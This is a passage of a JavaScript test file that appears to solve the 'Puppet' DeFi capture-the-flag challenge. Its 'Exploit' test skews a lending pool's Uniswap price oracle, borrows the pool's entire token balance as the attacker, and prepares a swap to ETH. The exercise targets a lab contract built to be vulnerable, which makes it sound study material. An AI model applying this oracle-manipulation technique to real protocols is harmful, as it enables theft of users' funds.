...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    const uniswapOracle = await this.lendingPool.uniswapOracle()
    await this.token.transfer(uniswapOracle, ether("2"), {
      from: deployer,
    });
    const poolBal = await this.token.balanceOf(this.lendingPool.address);
    await this.lendingPool.borrow(poolBal, {
      from: attacker,
    });
    const attackerBalanceAfter = await this.token.balanceOf(attacker);
    console.log(`attackerBalanceAfter: ${attackerBalanceAfter.toString()}`);
    const deadline = Math.round((new Date).getTime() / 1000) + 300
    console.log(`token to eth trade's deadline: ${deadline.toString()}`);
    const value = await this.uniswapExchange.getTokenToEthInputPrice(
      "3997876697587712"
    );
    console.log(`token's value denominated in ETH: ${value.toString()}`)
    await this.token.approve(this.uniswapExchange.address, "3997876697587712", {
      from: attacker,
    });
    // swaps some token to get back an amount of ETH greater than the amount that was spent in gas
  ...
  after(async function () {
    ...
    expect(await balance.current(attacker), "wrong ether").to.be.bignumber.gte(
